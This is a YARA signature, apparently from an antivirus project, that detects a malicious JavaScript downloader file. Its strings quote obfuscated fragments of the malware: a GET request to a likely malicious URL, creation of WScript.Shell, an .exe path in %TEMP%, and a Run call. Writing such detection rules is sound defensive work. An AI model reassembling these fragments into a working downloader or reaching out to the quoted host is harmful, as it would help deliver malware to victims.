rule sig_20160330_fffa4dfda9e4e785b0508194d2f0479a {
  meta:
    description = "datamaliciousorder - file 20160330_fffa4dfda9e4e785b0508194d2f0479a.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "be8113302a1170030e7e59b502d88c4e7bc2cd003a89143936eb282d935da8c1"

  strings:
    $s1  = "R[F](\"GET\", \"http://greenbee.com.ua/b7eosa\", false);" fullword ascii
    $s2  = "var Z = function AF() {return WScript[B](\"WScript\"+\".Shell\");}(), EP = 11;" fullword ascii
    $s3  = "function JP(K, OW){BH = BH * 1; return K - OW;};" fullword ascii
    $s4  = "if (R[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function MG(){return VW + \"\";};" fullword ascii
    $s6  = "function G() {return Z[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"WKZN18e4H9op.ex\" + \"e\";};" fullword ascii
    $s7  = "function V(QJ){Z[\"Run\"](QJ, BH, BH);};" fullword ascii
    $s8  = "function I() {return ((B0 == true) && (B0 == Y0)) ? 1 : BH;};" fullword ascii
    $s9  = "function Y()" fullword ascii
    $s10 = "var LQ = new this[\"Date\"]();" fullword ascii
    $s11 = "return JP(ZU, J);" fullword ascii
    $s12 = "function MF(){return 22;};" fullword ascii
    $s13 = "function RO(PC) {var IN = (1, 2, 3, 4, 5, PC); return IN;};" fullword ascii
    $s14 = "}while (DX);" fullword ascii
    $s15 = "function UT(){return B;};" fullword ascii
    $s16 = "var B0 = false;" fullword ascii
    $s17 = "var Y0 = false;" fullword ascii
    $s18 = "Y0 = true; " fullword ascii
    $s19 = "B0 = true; " fullword ascii
    $s20 = "var U0 = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}